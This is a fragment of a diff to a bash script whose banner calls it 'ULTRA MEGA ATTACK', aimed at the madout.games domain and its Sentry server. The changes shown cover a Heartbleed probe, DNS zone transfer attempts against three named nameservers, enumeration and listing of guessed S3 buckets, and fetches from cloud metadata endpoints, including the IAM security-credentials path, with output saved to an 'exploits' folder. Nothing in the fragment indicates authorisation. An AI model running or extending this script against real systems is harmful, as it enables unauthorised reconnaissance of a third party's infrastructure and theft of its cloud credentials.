     wait $pid 2>/dev/null
-    if [ -s "$OUTPUT_DIR/exploits/heartbleed.txt" ]; then
-        log_result "heartbleed" "[+] Heartbleed possible"
-    else
-        log_result "heartbleed" "[-] Heartbleed not found"
-    fi
+    [ -s "$OUTPUT_DIR/exploits/heartbleed.txt" ] && log_result "heartbleed" "[+] Heartbleed possible" || log_result "heartbleed" "[-] Heartbleed not found"
 else
-    echo -e "${YELLOW}[!] openssl not found, trying to install...${NC}"
     apk add openssl 2>/dev/null
     sleep 5
     if command -v openssl &> /dev/null; then
-        echo -e "${GREEN}[+] openssl installed, testing...${NC}"
         openssl s_client -connect sentry.madout.games:443 -tlsextdebug 2>&1 | grep -i "heartbeat" > "$OUTPUT_DIR/exploits/heartbleed.txt" &
         pid=$!
         sleep 5
         kill -9 $pid 2>/dev/null
         wait $pid 2>/dev/null
-        if [ -s "$OUTPUT_DIR/exploits/heartbleed.txt" ]; then
-            log_result "heartbleed" "[+] Heartbleed possible"
-        else
-            log_result "heartbleed" "[-] Heartbleed not found"
-        fi
-    else
-        echo -e "${RED}[-] openssl could not be installed, skipping${NC}"
-        log_result "heartbleed" "[-] openssl not available, skipping"
+        [ -s "$OUTPUT_DIR/exploits/heartbleed.txt" ] && log_result "heartbleed" "[+] Heartbleed possible" || log_result "heartbleed" "[-] Heartbleed not found"
     fi
 fi
 echo ""
 
 # ============================================
-# DNS ZONE TRANSFER (dig axfr + host -l)
+# DNS ZONE TRANSFER
 # ============================================
 echo -e "${YELLOW}[5] DNS Zone Transfer${NC}"
 
 if command -v dig &> /dev/null; then
-    echo -e "${CYAN}Testing with dig axfr...${NC}"
     for ns in "ns1.madout.games" "ns2.madout.games" "ns3.madout.games"; do
-        echo -n "dig axfr @$ns... "
-        dig axfr @$ns madout.games 2>/dev/null > "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt"
-        if [ -s "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt" ]; then
-            echo -e "${GREEN}SUCCESS!${NC}"
-            log_result "zone_transfer" "[+] Zone transfer success (dig): $ns"
-            cat "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt" | head -5
-        else
-            echo -e "${RED}FAILED${NC}"
-        fi
+        dig axfr @$ns madout.games 2>/dev/null > "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt" &
+        pid=$!
+        sleep 3
+        kill -9 $pid 2>/dev/null
+        wait $pid 2>/dev/null
+        [ -s "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt" ] && log_result "zone_transfer" "[+] Zone transfer success (dig): $ns"
     done
 fi
 
 if command -v host &> /dev/null; then
-    echo -e "${CYAN}Testing with host -l...${NC}"
     for ns in "ns1.madout.games" "ns2.madout.games" "ns3.madout.games"; do
-        echo -n "host -l @$ns... "
-        host -l madout.games "$ns" 2>/dev/null > "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt"
-        if [ -s "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt" ]; then
-            echo -e "${GREEN}SUCCESS!${NC}"
-            log_result "zone_transfer" "[+] Zone transfer success (host): $ns"
-            cat "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt" | head -5
-        else
-            echo -e "${RED}FAILED${NC}"
-        fi
+        host -l madout.games "$ns" 2>/dev/null > "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt" &
+        pid=$!
+        sleep 3
+        kill -9 $pid 2>/dev/null
+        wait $pid 2>/dev/null
+        [ -s "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt" ] && log_result "zone_transfer" "[+] Zone transfer success (host): $ns"
     done
-fi
-
-if ! command -v dig &> /dev/null && ! command -v host &> /dev/null; then
-    echo -e "${RED}[-] dig and host not found, skipping${NC}"
-    log_result "zone_transfer" "[-] dig and host not found"
 fi
 echo ""
 
@@ -593,10 +644,10 @@ echo ""
 # ============================================
 echo -e "${YELLOW}[6] S3 Bucket Scan${NC}"
 for bucket in "sentry-backup" "sentry-files" "sentry-static" "sentry-media" "sentry-data"; do
-    r=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "https://$bucket.s3.amazonaws.com/" 2>/dev/null)
+    r=$(safe_status "https://$bucket.s3.amazonaws.com/" $TIMEOUT)
     if [ "$r" == "200" ] || [ "$r" == "403" ]; then
         log_result "s3" "[+] $bucket ($r)"
-        curl -k -s "https://$bucket.s3.amazonaws.com/?list-type=2" > "$OUTPUT_DIR/exploits/s3_${bucket}_list.xml" 2>/dev/null
+        safe_download "https://$bucket.s3.amazonaws.com/?list-type=2" "$OUTPUT_DIR/exploits/s3_${bucket}_list.xml" $TIMEOUT
     fi
 done
 echo ""
@@ -606,9 +657,9 @@ echo ""
 # ============================================
 echo -e "${YELLOW}[7] Cloud Metadata${NC}"
 for path in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/latest/user-data/" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" "http://metadata.google.internal/computeMetadata/v1/" "http://169.254.169.254/metadata/instance"; do
-    r=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "$path" 2>/dev/null)
+    r=$(safe_status "$path" $TIMEOUT)
     if [ "$r" == "200" ] || [ "$r" == "401" ]; then
-        curl -k -s --connect-timeout $TIMEOUT "$path" > "$OUTPUT_DIR/exploits/cloud_$(echo $path | tr '/' '_' | cut -c1-30).html" 2>/dev/null
+        safe_download "$path" "$OUTPUT_DIR/exploits/cloud_$(echo $path | tr '/' '_' | cut -c1-30).html" $TIMEOUT
         log_result "cloud_metadata" "[+] $path ($r)"
     fi
 done
@@ -636,7 +687,7 @@ echo ""
 # FINAL REPORT
 # ============================================
 echo -e "${RED}=====================================${NC}"
-echo -e "${GREEN}ULTRA MEGA ATTACK - FİNAL COMPLETE!${NC}"
+echo -e "${GREEN}ULTRA MEGA ATTACK - FIXED COMPLETE!${NC}"
 echo -e "${RED}=====================================${NC}"
 echo ""
 echo -e "${YELLOW}RESULTS:${NC}"
